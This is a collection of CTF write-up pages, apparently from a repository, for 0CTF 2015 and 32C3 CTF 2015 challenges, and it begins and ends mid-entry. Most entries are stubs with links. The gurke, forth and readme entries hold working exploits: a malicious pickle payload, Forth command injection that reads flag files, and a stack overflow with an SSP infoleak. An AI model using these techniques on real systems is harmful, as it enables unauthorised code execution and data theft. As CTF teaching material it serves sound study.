> MD4 wrote a letter to dear Lily. Do U know what it means?
>
> <202.112.26.104:5000>
>
> <202.112.28.113:5000>

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/03/30/lily-web-200>
* <http://privatepaste.com/a659e78811># 0CTF 2015 Quals CTF: mislead

**Category:** Web
**Points:** 300
**Solves:** 17
**Description:** 

> You bad bad!
>
> <http://202.112.26.101/mislead/>
>
> <http://202.112.28.110/mislead/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/># 32C3 CTF 2015 : blobberry

**Category:** Embedded
**Points:** 300
**Solves:** 21
**Description:**

> We made this new Raspberry Pi OS, check it out!


## Write-up

(TODO)

## Other write-ups and resources

* <http://blukat29.github.io/2015/12/32c3ctf-blobberry/>
# 32C3 CTF 2015 : HD44780

**Category:** Embedded
**Points:** 150
**Solves:** 40
**Description:**

> The logic states of the GPIOs have been recorded Figure out the displayed message. You're gonna need this here


## Write-up

(TODO)

## Other write-ups and resources

* <https://adarshdinesh.wordpress.com/2015/12/29/embedded-hd44780-32c3-ctf-2015/>
* <https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/hd44780_embedded_150#eng-version>
* <https://github.com/racoons-team/ctf/tree/master/2015-12-27-32c3/HD44780_embedded_150>
* <http://pastebin.com/UXjk7wSy>
# 32C3 CTF 2015 : NordicByNature

**Category:** Embedded
**Points:** 400
**Solves:** 5
**Description:**

> I can't open my electronic vault anymore :( I reverse engineered a bit of the PCB and attached a JTAG debugger to it, but I can't seem to be able to dump the code and figure out how to reset the PIN. Could you help me out here?
> 
> 
> You can access the vault here: <http://136.243.194.58:8080>
> 
> 
> Some nice German music while you solve this challenge: <https://www.youtube.com/watch?v=KfWyo2mqXnw>


## Write-up

(TODO)

## Other write-ups and resources

* <https://tasteless.eu/post/2015/12/32c3ctf-emb400/>
* <http://blog.includesecurity.com/2015/11/NordicSemi-ARM-SoC-Firmware-dumping-technique.html>
# 32C3 CTF 2015 : traces

**Category:** Embedded
**Points:** 200
**Solves:** 17
**Description:**

> Could you please decode [this](https://mega.nz/#!fB0WVL4b!axOWxqINPsBSOXpGQrDLO_nfc250JsmewDFRea39ldQ) for me? KTHXBYE!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2015-12-27-32c3/traces_embedded_200>
# 32C3 CTF 2015 : config.bin

**Category:** Forensics
**Points:** 150
**Solves:** 27
**Description:**

> We have obtained what we believe is a configuration backup of an embedded device. However, it seems to be encrypted. Maybe you can help us with decryption?


## Write-up

by [SleepProgger](https://github.com/SleepProgger)

After a quick hexdump we might realize that the first 4 bytes are looking pretty much like a magic header.

    hexdump -C config.bin | head
    00000000  43 46 47 31 00 00 32 d0  ef 92 7a b0 5a b6 d8 0d  |CFG1..2...z.Z...|
    00000010  30 30 30 30 30 30 00 00  00 05 00 03 00 00 00 00  |000000..........|

After searching for "CFG1" with the search engine of our choice, we might find [this](https://heinrichs.io/207) blog entry.  This tells us it might be a firmware image of some router (or at least something which looks like it).  
There is a windows tool on that website to decrypt the firmware images, lets see if it works for us:

    decrypting config.bin...
    reading config.bin... 13056 bytes read.
    parsing header... ok.
    setting crypto key... ok.
    decrypting... MD5 of plaintext invalid.
    
Hmm, nope. That looks like it might be in deed the right algorithm, but something is wrong (maybe the password).  
Well, that would have been too easy otherwise.  
So lets try if we can parse the file header with the information provided in that block entry.
As a a python ctypes Structure the header looks like this:

    class Header(ctypes.BigEndianStructure):
        _fields_ = [
                    ("magic", ctypes.ARRAY(ctypes.c_char, 4)),
                    ("payload_size", ctypes.c_uint32),
                    ("header_md5", ctypes.ARRAY(ctypes.c_ubyte, 8)),
                    ("etl", ctypes.ARRAY(ctypes.c_uint8, 7)), # always zero
                    ("unused_1", ctypes.c_char),
                    ("password_len", ctypes.c_uint16),
                    ("padding_len", ctypes.c_uint16),
                    ("unused_2", ctypes.ARRAY(ctypes.c_ubyte, 4)),
                    ("plaintext_md5", ctypes.ARRAY(ctypes.c_ubyte, 16))
                    ]

The header contains a field for the first 8 bytes of a md5 over the header. After testing if it is correct, we can be pretty sure the header structure is right.  
So, chances are good we need to find the correct password.  
~~Stupidly~~Luckily the length of the password is saved in the header and an MD5 sum over the plaintext, too (The password is of 5 chars length).
According to the linked blog post the *plaintext* is encrypted with AES256 in ECB mode.
That sounds reasonable enough to bruteforce it.  
... But it is way to slow. The decryption of the whole cryptext needs way to long (~13kb after all).  
With ~8k tries per second we'll never find the password.

Maybe we find some other way to verify the password.  
After some searching we might find out that the plaintext of the images in this format always seem to be gzip compressed.  
This is **awesome**, as the gzip format has a 3 byte (2 byte in theory, 3 in fact) magic header.  
So we only need to decrypt the first block with AES and verify the first 3 bytes (With additionally md5 verification IF the magic header was found).  
This gives us about 280k try per second. Not really fast, but it might be fast enough for a password with 5 chars.  
Finally we can start bruteforcing.
After some (more) time we find our password and are able to decrypt the file.  
It is an tar.gz archive containing two files.
Digging through them we find a line like this *(password changed)*:

    PASSWORD="MzJDM19hc2QxMjE1NjRxMTIxZD/nU2NGE1NnNkMWYzMmFkMTMyYTQ1"
After removing that evil `/n` in there we are able to base64 decode it and get the password. **YAY**

*The tool i wrote to crack and decrypt the firmware now makes about 1000000 check per second on my system and is linked in `Other write-ups and resources`*



## Other write-ups and resources

* <https://github.com/SleepProgger/ctf_stuff/blob/master/32C3/config.bin/crack_config.py>
* <https://irq5.io/2015/12/30/32c3-ctf-write-up-config-bin/>
* <http://pastebin.com/uTt4C2kF> [Log](http://pastebin.com/ekpHrgPt)
* [Information about the fileformat and decrypter @https://heinrichs.io/](https://heinrichs.io/207)
# 32C3 CTF 2015 : the

**Category:** Forensics
**Points:** 300
**Solves:** 8
**Description:**

> There's some data exfiltration going on in this pcap. Can you figure you what happened?


## Write-up

(TODO)

## Other write-ups and resources

* <https://tasteless.eu/post/2015/12/32c3ctf-for300/>
# 32C3 CTF 2015 : aes

**Category:** Misc
**Points:** 250
**Solves:** 5
**Description:**

> Today, everything needs crypto! We developed an AES encrypt module for your ARM chip!
> 
> 
> The module can be accessed via the address range 0x40048000..0x4004807f, see the example for details (binary is best documentation!)
> 
> 
> This demo <http://136.243.194.38:8080/index.htm> device is only capable of encrypting 10 times, afterwards, the cpu has to be powercycled to encrypt anything else.
> 
> 
> Every module is preseeded with a random key and a serial number as input(Hint: this is the flag) the result can be found in the output buffer before anything else is encrypted.


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/FZxMidiG>
* [Patch against qemu to add the custom device](http://shells.aachen.ccc.de/~spq/0001-challenge-device-added-and-chip-which-has-this.patch.gz)
# 32C3 CTF 2015 : gurke

**Category:** Misc
**Points:** 300
**Solves:** 111
**Description:**

> Non-standard [gurke](./gurke): <https://32c3ctf.ccc.ac/uploads/gurke> Talk to it via HTTP on <http://136.243.194.43/>.


## Write-up

by [m1ghtym0](https://github.com/m1ghtym0)

"It's not a standard gurke" is quite accurate.
First it creates a flag object, which contains the flag in the "flag" attribute.
Then it establishes a syscall-filter which is quite restrictive.
Finally it does what we were looking for: A pickle.load with user supplied data:

    data = os.read(0, 4096)
    try:
      res = pickle.loads(data)
      print 'res: %r\n' % res
    except Exception as e:
      print >>sys.stderr, "exception", repr(e)


However the syscall-filter prevents us from suppling a pickled object with a malicious
__reduce__ function, instead we have to get hold of the "flag" object's flag attribute.

Therefore we have to write a little pickle bytecode:

    cinspect\ngetmembers\n(c__main__\nflag\ntR.\n

Which is based on the opcode overview found here:
http://svn.python.org/projects/python/trunk/Lib/pickle.py

The pickle interpreter works stack-based and the code above does the following (pseudocode):

    push inspect.getmembers
    push __main__.flag
    pop func
    pop arg
    push (func, arg)
    call func(arg)
    ret

Which basically calls inspect.getmembers(flag).
The output will include the flag attribute and it's value.

The complete exploit:

    import urllib, urllib2
    import re
    url = 'http://136.243.194.43/'
    # pickle bytecode
    # c:module:function pushes object on the stack
    # (: push mark object
    # t:  pop two top most stack elements + create tuple of them + push tuple
    # R: call callable top most stack element
    # .: rerturn
    req = urllib2.Request(url, data="cinspect\ngetmembers\n(c__main__\nflag\ntR.\n", headers={'Content-type': 'application/python-pickle'})
    response = urllib2.urlopen(req)
    the_page = response.read()
    flag = re.findall("32c3_.{25}", the_page)[0]
    print "flag: " + flag


## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/gurke_misc_300#eng-version>
* <http://blukat29.github.io/2015/12/32c3ctf-gurke/>
* <https://github.com/krx/CTF-Writeups/tree/master/32C3%202015/misc300%20-%20gurke>
* <http://nopat.ch/2015/12/29/32c3ctf-misc-gurke/>
* <http://katc.hateblo.jp/entry/2015/12/30/154329>
* <https://irq5.io/2015/12/30/32c3-ctf-write-up-gurke/>
* <http://nandynarwhals.org/2015/12/31/32c3ctf-gurke-misc-300/>
* <http://v0ids3curity.blogspot.in/2015/12/32c3-ctf-misc-300-gurke.html?m=0>
* [Japanese](http://blog.objc.jp/?p=2294)
* <http://pastebin.com/JikU89uJ>
* <http://pastebin.com/VUkfxYyP>
# 32C3 CTF 2015 : vault

**Category:** Misc
**Points:** 400
**Solves:** 2
**Description:**

> Get the flag ssh://eve@136.243.194.47
> 
> 
> Password: nohaxplz

## System Information

Here are some information that can help to set up the challenge locally.

    eve@vault:/$ uname -a
    Linux vault 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
    eve@vault:/$ ls -la /home/adam/
    total 28
    dr-xr-xr-x 2 root root     4096 Dec 27 15:42 .
    drwxr-xr-x 4 root root     4096 Dec 27 15:34 ..
    -r-------- 1 adam nogroup    32 Dec 27 15:41 flag
    -r-sr-xr-x 1 adam nogroup 14025 Dec 27 15:34 vault_explorer
    eve@vault:/$ ls -la /vault
    total 4
    drwxrwxrwt  2 root nogroup   40 Jan  2 12:58 .
    drwxr-xr-x 23 root root    4096 Dec 27 15:51 ..
    eve@vault:/$ id
    uid=1338(eve) gid=65534(nogroup) groups=65534(nogroup)
    eve@vault:/$ cat /etc/passwd
    # snip... relevant users:
    adam:x:1337:65534::/home/adam:
    eve:x:1338:65534::/home/eve:

adam owns the flag and `vault_explorer` is a setuid binary that can be used to create and read files in `/vault`.

    eve@vault:/$ /home/adam/vault_explorer
    Welcome to the vault.
    Set up your password and store your data securely with our novel military grade triple-xor encryption.
    [l] list directory
    [s] store data
    [r] retrieve data
    [?] menu
    [q] quit
    > l
    total 0
    > s
    data? asd
    > l
    total 4
    -rw------- 1 adam nogroup 3 Jan  2 13:28 BZo7qh
    > r
    filename? BZo7qh
    content: "asd"
    > q
    Goodbye!
    eve@vault:/$ ls -la /vault
    total 8
    drwxrwxrwt  2 root nogroup   60 Jan  2 13:28 .
    drwxr-xr-x 23 root root    4096 Dec 27 15:51 ..
    -rw-------  1 adam nogroup    3 Jan  2 13:28 BZo7qh

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/stephenR/9fc14888ef2cec7c7b99>
# 32C3 CTF 2015 : bingo

**Category:** Pwn
**Points:** 500
**Solves:** 3
**Description:**

> I have a bingo.
> 
> 
> nc 136.243.194.45 1024


## Write-up

(TODO)

## Other write-ups and resources

* [Exploit by the challenge author](http://shells.aachen.ccc.de/~spq/bingo_exploit.tar.gz)
# 32C3 CTF 2015 : cryptmsg

**Category:** Pwn
**Points:** 400
**Solves:** 4
**Description:**

> Can you find the bug?
> 
> 
> <http://136.243.194.56:8000/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:32c3:cryptmsg>
* <https://rzhou.org/~ricky/32c3/cryptmsg/>
# 32C3 CTF 2015 : docker

**Category:** Pwn
**Points:** 250
**Solves:** 7
**Description:**

> Extract some flag from ssh://eve@136.243.194.40
> 
> 
> Password: nohaxplz

## System Information

Here are some information that can help to set up the challenge locally.

@tsuro via IRC: `and you want a kernel that is not too ancient. I used ubuntu 14.04`

    eve@docker:/$ uname -a
    Linux docker 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
    eve@docker:/$ id
    uid=1338(eve) gid=65534(nogroup) groups=65534(nogroup)
    eve@vault:/$ cat /etc/passwd
    # snip... relevant users:
    adam:x:1337:65534::/home/adam:
    eve:x:1338:65534::/home/eve:

The user adam owns the flag and there is a setuid binary `dockerrun`, which just executes `/usr/bin/docker run -it --privileged=false -u 1337:65534 --cap-drop=ALL --net=host ubuntu /bin/bash`.

    eve@docker:/$ ls -la /home/adam
    total 24
    dr-xr-xr-x 2 root root 4096 Dec 27 14:21 .
    drwxr-xr-x 4 root root 4096 Dec 27 13:47 ..
    -rwsr-xr-x 1 root root 8556 Dec 27 13:40 dockerrun
    -r-------- 1 adam root   53 Dec 27 14:32 flag
    eve@docker:/$ /home/adama/dockerrun 
    I have no name!@docker1404:/$ 

## Write-up

(TODO)

## Other write-ups and resources

* <https://kitctf.de/writeups/32c3ctf/docker/>
* <http://ebfe.dk/2016/01/04/pwning-docker/>
* <https://gist.github.com/stephenR/5d0987531e2b3ab3a730>
# 32C3 CTF 2015 : forth

**Category:** Pwn
**Points:** 150
**Solves:** 372
**Description:**

> Connect to 136.243.194.49:1024 and get a shell.


## Write-up

by [polym](https://github.com/abpolym)

Connecting to the services with `nc` yields some important information about what type of service we are dealing with:

```bash
$ nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
s
[s] error(2): unknown word.
```

Seems like [`yForth`](https://packages.debian.org/wheezy/yforth) is an interpreter for the Forth language.

Our ultimate goal is to execute commands on the machine, so we search for `execute command forth` to find [a rosetta link](http://rosettacode.org/wiki/Execute_a_system_command#Forth) that explains and lists how to execute commands in different languages, including the Forth language:

	s" ls" system

Testing this yields in an output of `ls` on the 32c3 server:

```bash
echo 's" ls" system' | nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
flag.txt  README.gpl  run.sh  yforth
ok
```

We just have to read the flag:

```bash
$ echo 's" cat flag.txt" system' | nc 136.243.194.49 1024 | tail -n+5
32C3_a8cfc6174adcb39b8d6dc361e888f17b
ok
```

PS: We can also read the contents of `README.gpl` and `run.sh` to see how the challenge is executed to test it locally:

```bash
$ echo 's" cat run.sh" system' | nc 136.243.194.49 1024 | tail -n+5
#!/bin/sh
exec socat TCP-LISTEN:1024,fork,reuseaddr EXEC:./yforth,echo=0,pty,stderr
ok
```

## Other write-ups and resources

* <https://github.com/TactiFail/CTF-Writeups/blob/master/2015/32C3/pwn/forth.md>
* <http://securityerror.github.io/blog/12292015/forth.html>
* <https://nuc13us.wordpress.com/2015/12/30/32c3-ctf-writeup-forth-150/>
* <http://nopat.ch/2015/12/30/32c3ctf-pwn-forth/>
* <http://nandynarwhals.org/2015/12/30/32c3ctf-forth-pwn-150/>
* <https://github.com/p4-team/ctf/blob/master/2015-12-27-32c3/forth_pwn_150/README.md#eng-version>
* <https://www.youtube.com/watch?v=12el1zm99e4>
* [Execute a cmd with forth](http://rosettacode.org/wiki/Execute_a_system_command#Forth)
# 32C3 CTF 2015 : ranger

**Category:** Pwn
**Points:** 400
**Solves:** 16
**Description:**

> Connect to 136.243.194.52 1024 and get a fresh instance spawned for you. You're gonna need this.


## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/32c3/ranger/>
# 32C3 CTF 2015 : readme

**Category:** Pwn
**Points:** 200
**Solves:** 31
**Description:**

> Can you read the flag?
>
>
> nc 136.243.194.62 1024


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://nandynarwhals.org/2015/12/31/32c3ctf-readme-pwn200/> (Common understanding)
* <https://nuc13us.wordpress.com/2015/12/31/32c3-ctf-pwn-200-readme/> 
* <http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up/> (IDA decompiled source)
* <http://ebfe.dk/ctf/2016/01/04/32c3-readme/> (Detailed understanding)
* [Chinese](http://ddaa.tw/32c3ctf_2015_pwn_200_readme.html) (Detailed understanding)
* [Japanese](http://pwn.hatenadiary.jp/entry/2015/12/31/103328) (Detailed description, however in Japanese :()

### Meta

Keywords:

* Stack Buffer Overflow `sbo` at `_IO_gets`
* [Stack Smashing Protection Infoleak](http://seclists.org/bugtraq/2010/Apr/243) `sspi`

Similar challenges:

* [ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit](https://github.com/ctfs/write-ups-2015/tree/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit)

We are given a gzipped tar archive that contains an x86-64bit stripped ELF for Linux:

```bash
$ file readme.bin
readme.bin: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=7d3dcaa17ebe1662eec1900f735765bd990742f9, stripped
```

Running it:

```bash
$ ./readme.bin 
Hello!
What's your name? name
Nice to meet you, name.
Please overwrite the flag: flag
Thank you, bye!
```

We can provide a name and a flag that overwrites the old flag.


Running `ltrace -s 256 -f ./readme.bin 2> /tmp/out` and checking the output of `/tmp/out`:

```bash
$ $ lt ./readme.bin 
Hello!
What's your name? myname
Nice to meet you, myname.
Please overwrite the flag: myflag
Thank you, bye!
$ tail -f /tmp/out 
[pid 2732] __libc_start_main(0x4006d0, 1, 0x7fff52713028, 0x4008b0 <unfinished ...>
[pid 2732] setbuf(0x7f430f9d2400, 0)                  = <void>
[pid 2732] __printf_chk(1, 0x400934, 0x7f430f9d39e0, 0xfbad2084) = 25
[pid 2732] _IO_gets(0x7fff52712e10, 0x7f430f9d39e0, 25, -1) = 0x7fff52712e10
[pid 2732] __printf_chk(1, 0x400960, 0x7fff52712e10, 0xfbad2288) = 53
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'm'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'y'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'f'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'l'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'a'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = 'g'
[pid 2732] _IO_getc(0x7f430f9d2640)                   = '\n'
[pid 2732] memset(0x600d26, '\0', 26)                 = 0x600d26
[pid 2732] puts("Thank you, bye!")                    = 16
[pid 2732] +++ exited (status 0) +++
```

We notice that our first input is read using `_IO_gets`, causing the stack buffer overflow, while the second input is read using `_IO_getc` until a newline or `0x20` bytes are read.

Decompiling the binary using `radare2` with `VV @ fcn.004007e0` confirms this:

![](./fcn-004007e0.png)

PS: You can also use IDA to generate pseudo C code as done in [this writeup](http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up/).

We can also see the flag located in the `.data` section at `0x00600d20`:

```bash
[0x004006ee]> izz | grep 32C3
vaddr=0x00600d20 paddr=0x00000d20 ordinal=029 sz=32 len=31 section=.data type=ascii string=32C3_TheServerHasTheFlagHere...
```

After some testing, we can cause a stack buffer overflow:

```bash
$ p -c 'print "A"*0x200+"\n"+"A"*0x200+"\n"' | ./readme.bin                                                                                                                       
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./readme.bin terminated
Aborted (core dumped)
```

Unfortunately, we also see a `*** stack smashing detected ***` error message, which hints that the binary is [`Fortify Source`](https://www.redhat.com/magazine/009jul05/features/execshield/) protected, which essentially is a canary-based stack protection.

This is confirmed using `checksec`:

```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

However, the stack smashing protection Fortify [suffers from an infoleak](http://seclists.org/bugtraq/2010/Apr/243): If we can overwrite the program name pointer `__libc_argv[0]`, which can be seen in the error message above, then we can leak memory data.

To see why, we look at the `glibc` source code and see a call from [`__stack_chk_fail` to `__fortify_fail`](https://fossies.org/dox/glibc-2.22/chk__fail_8c_source.html), if a buffer overflow has been detected.

[`__fortify_fail`](https://fossies.org/dox/glibc-2.22/fortify__fail_8c_source.html) then calls `__libc_message` with `__libc_argv[0]` as argument for our program name, resulting in our error message.

To find out how much we have to write, we do some simple calculations with `gdb-peda`:

```bash
gdb-peda$ b *0x0040080e
Breakpoint 1 at 0x40080e
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/32c3/readme/readme/readme.bin
[...]
gdb-peda$ find /home
Searching for '/home' in: None ranges
Found 4 results, display max 4 items:
[stack] : 0x7fffffffe760 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
[stack] : 0x7fffffffee82 ("/home/vbox/pwn/tasks/32c3/readme/readme")
[stack] : 0x7fffffffeef1 ("/home/vbox")
[stack] : 0x7fffffffefc5 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
gdb-peda$ find 0x7fffffffe760
Searching for '0x7fffffffe760' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd4018 --> 0x7fffffffe760 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
   [stack] : 0x7fffffffe4f8 --> 0x7fffffffe760 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
   gdb-peda$ distance $rsp 0x7fffffffe4f8
   From 0x7fffffffe2e0 to 0x7fffffffe4f8: 536 bytes, 134 dwords
```

* Set a `b`reakpoint right before the `_IO_gets` call and `r`un the binary
* Find the occurrence of our program name on the stack, writing down the starting address
* Find a pointer to this address on the stack
* Calculate the distance between the current stack frame pointer and the pointer to `__libc_argv[0]`

To overwrite the program name, we have to write `536` or `0x218` bytes.

We have to provide a pointer for `__libc_argv[0]` to test out hypothesis - let's use the pointer to our overwritten flag @ `0x600d20`!

[This python script](./solve1.py) does the job:

```bash
# Terminal 1: Run the service
$ exec socat TCP-LISTEN:6666,fork,reuseaddr EXEC:./readme.bin &
[1] 3128
$ fg
exec socat TCP-LISTEN:6666,fork,reuseaddr EXEC:./readme.bin
[...]
# Termina 2: Run the first try solve1.py
$ p solve1.py 
[+] Opening connection to localhost on port 6666: Done
[+] Recieving all data: Done (16B)
[*] Closed connection to localhost port 6666
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`.
Please overwrite the flag: Thank you, bye!
# Terminal 1: See output
*** stack smashing detected ***: Overwritten Flag terminated
```

However, as you can see, the flag is overwritten by our second input and thus we cannot leak the flag this way.

Adding to that, another problem seems to be that our error message is printed at server side and not on our side.

To solve the first problem, we try to find another occurrence of our flag with `gdb-peda`:

```bash
gdb-peda$ b *0x0040080e
Breakpoint 1 at 0x40080e
gdb-peda$ r
[...]
gdb-peda$ find 32C3
Searching for '32C3' in: None ranges
Found 2 results, display max 2 items:
readme.bin : 0x400d20 ("32C3_TheServerHasTheFlagHere...")
readme.bin : 0x600d20 ("32C3_TheServerHasTheFlagHere...")
```

Looks like the flag also is stored into read-only memory @ `0x400d20`, which - according to [this writeup](http://ebfe.dk/ctf/2016/01/04/32c3-readme/) - is the norm for ELFs. Further information needs to be found :)!

So if we overwrite `__libc_main[0]` with `0x400d20`, we will see our flag:

```bash
[.. same as above ..]
# Terminal 2: Output is now the flag!
*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated
```

All that is left to do is somehow redirect the server output to our side, which can be done by setting the environment variable `LIBC_FATAL_STDERR_` to `1`: `LIBC_FATAL_STDERR_=1`.

To know why this works, we again read `gibc` source code, this time the source code for the [`__libc_message`](https://fossies.org/dox/glibc-2.22/sysdeps_2posix_2libc__fatal_8c_source.html) function.
We see that the environment variable `LIBC_FATAL_STDERR_` is read using `__libc_secure_getenv`.
If it isn't set or empty and thus `\0` or `NULL`, `stderr` is redirected to `_PATH_TTY`, which usually is `/dev/tty` - hence error messages will be not sent to `stderr` but to a device only visible on server side.

In order to set this environment variable on server side for thius binary, we have a look at the stack @ our `__libc_argv[0]` address:

```bash
gdb-peda$ find 0x7fffffffe760                                                                                                                                                     
Searching for '0x7fffffffe760' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd4018 --> 0x7fffffffe760 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
[stack] : 0x7fffffffe4f8 --> 0x7fffffffe760 ("/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin")
gdb-peda$ x/30xg 0x7fffffffe4f8
0x7fffffffe4f8: 0x00007fffffffe760      0x0000000000000000
0x7fffffffe508: 0x00007fffffffe793      0x00007fffffffe7a8
0x7fffffffe518: 0x00007fffffffe7bf      0x00007fffffffe7d0
0x7fffffffe528: 0x00007fffffffe7e8      0x00007fffffffe7f8
[...]
gdb-peda$ x/20s 0x00007fffffffe760
0x7fffffffe760: "/home/vbox/pwn/tasks/32c3/readme/readme/readme.bin"
0x7fffffffe793: "LC_PAPER=de_DE.UTF-8"
0x7fffffffe7a8: "LC_ADDRESS=de_DE.UTF-8"
[...]
```

We see a null pointer as well as several environment variable addresses after the `__libc_main[0]` address.
If we overwrite one of these addresses, we will be able to set `LIBC_FATAL_STDERR_`!
It becomes clear why we have to overwrite the flag in the first place: To provide the string for this environment variable!

Wrapping everything together, we solve the challenge using [this python script](./solve.py):

```bash
$ p solve.py 
[+] Opening connection to localhost on port 6666: Done
[+] Recieving all data: Done (92B)
[*] Closed connection to localhost port 6666
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated
```

The actual flag (the authors either compiled the task again with another flag or edited the flag inside the binary) is `32C3_ELF_caN_b3_pre7ty_we!rd...`.

## Other write-ups and resources

* <http://nandynarwhals.org/2015/12/31/32c3ctf-readme-pwn200/>
* <https://nuc13us.wordpress.com/2015/12/31/32c3-ctf-pwn-200-readme/>
* <https://www.youtube.com/watch?v=wLsckMfScOg> (Have a look if you want to see the solution step by step!)
* <http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up/>
* <http://ebfe.dk/ctf/2016/01/04/32c3-readme/>
* [Chinese](http://ddaa.tw/32c3ctf_2015_pwn_200_readme.html)
* [Chinese](http://www.ithao123.cn/content-10764874.html)
* [Korean](http://err0rless313.tistory.com/entry/32c3-CTF-readme)
* [Japanese](http://pwn.hatenadiary.jp/entry/2015/12/31/103328)
* <http://pastebin.com/Xd8jrhqV>
* <https://rzhou.org/~ricky/32c3/readme/>
* <http://pastebin.com/KX2t4GS8>
# 32C3 CTF 2015 : sandbox

**Category:** Pwn
**Points:** 300
**Solves:** 9
**Description:**
